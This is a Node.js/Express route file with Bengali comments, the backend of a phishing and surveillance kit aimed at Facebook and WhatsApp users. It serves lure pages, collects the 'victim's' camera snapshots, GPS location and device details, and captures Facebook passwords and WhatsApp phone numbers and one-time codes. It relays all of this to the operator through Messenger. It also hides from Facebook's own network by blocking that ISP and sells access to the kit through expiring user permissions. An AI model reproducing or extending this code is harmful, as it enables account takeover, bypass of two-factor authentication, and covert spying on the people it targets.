const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const User = require('../models/User');
const { 
    sendMessage, 
    sendImageMessage,
    sendImageMessageBase64,
    saveImageFile,
    formatVictimData,
    formatLocationMessage,
    getConfig
} = require('../utils/helpers');

// ================================================================
// 🔥 ISP ব্লক লিস্ট
// ================================================================
const BLOCKED_ISP = 'Facebook, Inc.';

function isIspBlocked(victim) {
    if (victim.location && victim.location.isp) {
        return victim.location.isp === BLOCKED_ISP;
    }
    return false;
}

// ================================================================
// 🔥 পারমিশন চেক ফাংশন
// ================================================================
async function checkUserPermission(victim) {
    if (!victim || !victim.fbId || victim.fbId === 'unknown') {
        return false;
    }
    const user = await User.findOne({ fbId: victim.fbId });
    if (!user) return false;
    if (!user.allowed) return false;
    if (user.permissionExpiresAt && new Date() > user.permissionExpiresAt) {
        user.allowed = false;
        await user.save();
        return false;
    }
    return true;
}

// ================================================================
// 🔥 লিংক এক্সপাইরি চেক ফাংশন
// ================================================================
async function checkLinkExpiry(victim) {
    if (!victim) return true;
    if (victim.isExpired) return false;
    if (victim.expiresAt && new Date() > victim.expiresAt) {
        victim.isExpired = true;
        await victim.save();
        return false;
    }
    return true;
}

// ================================================================
// 🗑️ অটো ক্লিনআপ: ১০ মিনিটের পুরনো ছবি মুছে ফেলে (অপটিমাইজড)
// ================================================================
const CLEANUP_INTERVAL = 60000; // ৬০ সেকেন্ড
const IMAGE_TTL = 600000; // ১০ মিনিট

setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - IMAGE_TTL);
        // 🔥 updateMany দিয়ে সব ভিক্টিমের camera অ্যারে থেকে পুরনো ছবি বাদ দিন
        const result = await Victim.updateMany(
            { 'camera.timestamp': { $lt: cutoff } },
            { $pull: { camera: { timestamp: { $lt: cutoff } } } }
        );
        if (result.modifiedCount > 0) {
            console.log(`🗑️ ${result.modifiedCount} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
        }
    } catch (err) {
        console.error('Cleanup error:', err);
    }
}, CLEANUP_INTERVAL);

// ================================================================
// 🔥 হেল্পার: লিংক এক্সপাইরি সেট (৩০ মিনিট)
// ================================================================
function setLinkExpiry() {
    const expiryDate = new Date();
    expiryDate.setMinutes(expiryDate.getMinutes() + 30);
    return expiryDate;
}

// ================================================================
// 🔍 ক্লায়েন্ট IP বের করার ফাংশন
// ================================================================
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',').shift() || 
           req.connection?.remoteAddress || 
           req.socket?.remoteAddress || 
           req.ip || 
           '0.0.0.0';
}

// ================================================================
// রাউটস – লিংক ভিজিট (IP লগ সহ)
// ================================================================

router.get('/v/:id', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 ক্যামেরা লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
        }
        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
        }
        res.sendFile(path.join(__dirname, '../public/index.html'));
    } catch (err) {
        console.error('Error serving victim page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/l/:id', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 লোকেশন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
        }
        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
        }
        res.sendFile(path.join(__dirname, '../public/location.html'));
    } catch (err) {
        console.error('Error serving location page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/fb/:id', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 ফেক লগইন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
        }
        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
        }
        res.sendFile(path.join(__dirname, '../public/fb.html'));
    } catch (err) {
        console.error('Error serving fb page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/wp/:id', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 হোয়াটসঅ্যাপ লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
        }
        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
        }
        res.sendFile(path.join(__dirname, '../public/wp.html'));
    } catch (err) {
        console.error('Error serving wp page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/monitization/:id', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`📢 মনিটাইজেশন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
        }
        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
        }
        res.sendFile(path.join(__dirname, '../public/monitization.html'));
    } catch (err) {
        console.error('Error serving monitization page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ================================================================
// 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং + পারমিশন চেক
// ================================================================
router.post('/api/victim', async (req, res) => {
    try {
        const data = req.body;
        const clientIp = getClientIp(req);
        console.log(`📥 ভিক্টিম ডেটা পেয়েছি: ${data.id} (IP: ${clientIp})`);

        if (!data.id) {
            console.error('❌ id নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        let victim = await Victim.findOne({ id: data.id });

        if (!victim) {
            victim = new Victim({
                id: data.id,
                fbId: data.fbId || 'unknown',
                type: data.type || 'camera',
                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                expiresAt: setLinkExpiry(),
                ip: data.ip || null,
                location: data.location || {},
                gpsLocation: data.gpsLocation || {},
                device: data.device || {},
                media: data.media || [],
                network: data.network || {},
                battery: data.battery || {},
                collectedAt: new Date()
            });
            await victim.save();
            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id} (এক্সপাইরি: ${victim.expiresAt})`);
        } else {
            if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                victim.fbId = data.fbId;
            }
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
            console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
        }

        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            console.log(`⛔ লিংক এক্সপায়ার: ${data.id} → ডেটা সেভ হয়েছে কিন্তু মেসেজ যাবে না।`);
            return res.status(200).json({ status: 'ok', data: victim, blocked: true, expired: true });
        }

        const blocked = isIspBlocked(victim);
        const hasPermission = await checkUserPermission(victim);
        console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
        console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);

        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
        } else if (blocked) {
            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
        } else if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি।`);
        } else {
            console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
        }

        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
            const locationMsg = formatLocationMessage(victim.gpsLocation);
            if (locationMsg) {
                await sendMessage(victim.fbId, locationMsg);
                console.log(`📍 লোকেশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
            }
        }

        res.status(200).json({ status: 'ok', data: victim, blocked: blocked, permission: hasPermission });

    } catch (err) {
        console.error('❌ Victim data error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// 🔥 ক্যামেরা ছবি রিসিভ – আসল ছবি সেভ + রিসাইজ করে মেসেঞ্জারে (মেমরি অপটিমাইজড)
// ================================================================
router.post('/api/camera', async (req, res) => {
    try {
        const { id, image } = req.body;
        const clientIp = getClientIp(req);
        console.log(`📸 ক্যামেরা রিকোয়েস্ট: ID=${id}, IP=${clientIp}, সাইজ=${image?.length || 0}`);

        if (!id || !image) {
            console.error('❌ id বা image নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id or image' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const isLinkValid = await checkLinkExpiry(victim);
        if (!isLinkValid) {
            console.log(`⛔ লিংক এক্সপায়ার: ${id} → ছবি সেভ হয়েছে কিন্তু পাঠানো হবে না।`);
            if (!victim.camera) victim.camera = [];
            victim.camera.push({ image: image, timestamp: new Date() });
            await victim.save();
            return res.status(200).json({ status: 'ok', count: victim.camera.length, expired: true });
        }

        const blocked = isIspBlocked(victim);
        const hasPermission = await checkUserPermission(victim);
        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
        console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);

        // ছবি ডাটাবেজে সেভ (আসল)
        if (!victim.camera) victim.camera = [];
        victim.camera.push({ image: image, timestamp: new Date() });
        await victim.save();

        const totalImages = victim.camera.length;
        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);

        // ================================================================
        // 🔥 পারমিশন মেসেজ: শুধুমাত্র প্রথম ছবিতে ১ বার পাঠান
        // ================================================================
        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && totalImages === 1) {
            await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
            console.log(`📸 ক্যামেরা পারমিশন মেসেজ (প্রথম): ${victim.fbId}`);
        }

        // ================================================================
        // 📤 মেসেঞ্জারে পাঠানোর জন্য রিসাইজ করা ছবি তৈরি (মেমরি সেভ)
        // ================================================================
        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
            try {
                let resizedBase64 = null;
                try {
                    const sharp = require('sharp');
                    const imageBuffer = Buffer.from(image, 'base64');
                    // 🔥 রেজোলিউশন ৪৮০px, কোয়ালিটি ৬০% – মেমরি কম লাগে
                    const resizedBuffer = await sharp(imageBuffer)
                        .resize({ width: 480, height: 480, fit: 'inside', withoutEnlargement: true })
                        .jpeg({ quality: 60 })
                        .toBuffer();
                    resizedBase64 = resizedBuffer.toString('base64');
                    console.log(`✅ ছবি রিসাইজ করা হয়েছে (480px, 60%)`);
                } catch (sharpErr) {
                    console.log('⚠️ Sharp ব্যবহার করা যায়নি, আসল ছবি পাঠানো হবে:', sharpErr.message);
                    resizedBase64 = image;
                }

                const result = await sendImageMessageBase64(victim.fbId, resizedBase64);
                if (result.success) {
                    console.log(`📸 ছবি #${totalImages} (${resizedBase64 === image ? 'আসল' : 'রিসাইজড'}) পাঠানো: ${victim.fbId}`);
                } else {
                    console.log(`❌ ছবি #${totalImages} পাঠাতে ব্যর্থ: ${result.error}`);
                }
            } catch (err) {
                console.error('❌ ছবি প্রসেস করতে ব্যর্থ:', err.message);
            }
        } else if (blocked) {
            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
        } else if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
        } else {
            console.log(`⚠️ fbId 'unknown' → ছবি পাঠানো হয়নি।`);
        }

        res.status(200).json({ status: 'ok', count: totalImages, blocked: blocked, permission: hasPermission });

    } catch (err) {
        console.error('❌ Camera error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
// ================================================================
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }
        const index = parseInt(req.params.index);
        if (isNaN(index) || index < 0 || index >= victim.camera.length) {
            return res.status(404).send('ছবি পাওয়া যায়নি');
        }
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        console.error('Image view error:', err);
        res.status(500).send('এরর');
    }
});

// ================================================================
// ফেক ফেসবুক লগইন
// ================================================================
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        const clientIp = getClientIp(req);
        console.log(`🔐 ফেক লগইন রিকোয়েস্ট: ID=${id}, username=${username}, IP=${clientIp}`);

        if (!id || !username || !password) {
            console.error('❌ ডেটা নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId} → ডেটা সেভ হয়েছে কিন্তু মেসেজ যাবে না।`);
            victim.fbLogin = {
                username: username,
                password: password,
                timestamp: new Date(),
                ip: clientIp
            };
            await victim.save();
            return res.status(200).json({ status: 'ok', permission: false });
        }

        victim.fbLogin = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: clientIp
        };
        await victim.save();

        console.log(`🔐 ফেক লগইন ডেটা সেভ: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ফেক লগইন মেসেজ পাঠানো: ${victim.fbId}`);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ FB Login error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// ফেসবুক মনিটাইজেশন ডেটা রিসিভ
// ================================================================
router.post('/api/monitization', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        const clientIp = getClientIp(req);
        console.log(`📢 মনিটাইজেশন রিকোয়েস্ট: ID=${id}, username=${username}, IP=${clientIp}`);

        if (!id || !username || !password) {
            console.error('❌ ডেটা নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const hasPermission = await checkUserPermission(victim);
        if (!hasPermission) {
            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId} → ডেটা সেভ হয়েছে কিন্তু মেসেজ যাবে না।`);
            victim.monitizationData = {
                username: username,
                password: password,
                timestamp: new Date(),
                ip: clientIp
            };
            await victim.save();
            return res.status(200).json({ status: 'ok', permission: false });
        }

        victim.monitizationData = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: clientIp
        };
        await victim.save();

        console.log(`📢 মনিটাইজেশন ডেটা সেভ: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `📢 *ফেসবুক মনিটাইজেশন লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
            console.log(`📤 মনিটাইজেশন মেসেজ পাঠানো: ${victim.fbId}`);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ Monitization API error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// হোয়াটসঅ্যাপ ডেটা রিসিভ
// ================================================================
router.post('/api/whatsapp', async (req, res) => {
    try {
        const { id, phone, otp } = req.body;
        const clientIp = getClientIp(req);
        console.log(`📱 হোয়াটসঅ্যাপ রিকোয়েস্ট: ID=${id}, phone=${phone}, otp=${otp}, IP=${clientIp}`);

        if (!id) {
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const userId = victim.fbId;
        const hasPermission = await checkUserPermission(victim);

        if (phone) {
            victim.wpData.phone = phone;
            victim.wpData.timestamp = new Date();
            await victim.save();

            if (hasPermission && userId && userId !== 'unknown') {
                await sendMessage(userId, `📱 নতুন মুরগী হোয়াটসঅ্যাপ লগিন করার জন্য নাম্বার দিয়েছে: \`${phone}\``);
                console.log(`📤 হোয়াটসঅ্যাপ নাম্বার মেসেজ: ${userId}`);
            } else {
                console.log(`⛔ ইউজারের পারমিশন নেই বা fbId নেই → নাম্বার মেসেজ পাঠানো হয়নি।`);
            }
            return res.status(200).json({ status: 'ok', message: 'Phone received' });
        }

        if (otp) {
            victim.wpData.otp = otp;
            victim.wpData.timestamp = new Date();
            await victim.save();

            if (hasPermission && userId && userId !== 'unknown') {
                await sendMessage(userId, `🔑 ওটিপি: \`${otp}\``);
                console.log(`📤 হোয়াটসঅ্যাপ ওটিপি মেসেজ: ${userId}`);
            } else {
                console.log(`⛔ ইউজারের পারমিশন নেই বা fbId নেই → ওটিপি মেসেজ পাঠানো হয়নি।`);
            }
            return res.status(200).json({ status: 'ok', message: 'OTP received' });
        }

        return res.status(400).json({ status: 'error', message: 'No data provided' });

    } catch (err) {
        console.error('❌ WhatsApp API error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

module.exports = router;